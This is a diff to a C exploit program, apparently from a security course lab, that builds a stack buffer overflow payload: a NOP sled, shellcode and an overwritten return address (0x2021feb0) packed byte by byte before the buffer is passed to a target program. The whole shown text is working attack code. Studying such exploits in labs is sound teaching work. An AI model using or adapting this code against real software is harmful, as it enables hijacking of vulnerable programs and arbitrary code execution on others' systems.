@@ -22,11 +22,17 @@ main ( int argc, char * argv[] )
 	for (int i = SHELL_SIZE; i < BUF_TO_RET; i++)
 		attack_buffer[i] = 0x90;
 
-	int * ret_address = (int*)&attack_buffer[BUF_TO_RET];
-	*ret_address = 0x2021fe10;
-	attack_buffer[BUF_SIZE - 1] = '\0';
+	// int * ret_address = (int*)&attack_buffer[BUF_TO_RET];
+	// *ret_address = 0x2021feb0;
+	// attack_buffer[BUF_SIZE - 1] = '\0';
 
-	printf("&attack_buffer[120] as hex: %u\n",attack_buffer[120]);
+	int target = 0x2021feb0;
+	attack_buffer[BUF_TO_RET] = (char) (target & 0xff);
+	attack_buffer[BUF_TO_RET + 1] = (char) ((target >> 8) & 0xff);
+	attack_buffer[BUF_TO_RET + 2] = (char) ((target >> 16) & 0xff);
+	attack_buffer[BUF_TO_RET + 3] = (char) ((target >> 24) & 0xff);
+
+	printf("&attack_buffer[120] as hex: %s\n",attack_buffer);
 
 	args[0] = TARGET;
 	args[1] = attack_buffer;
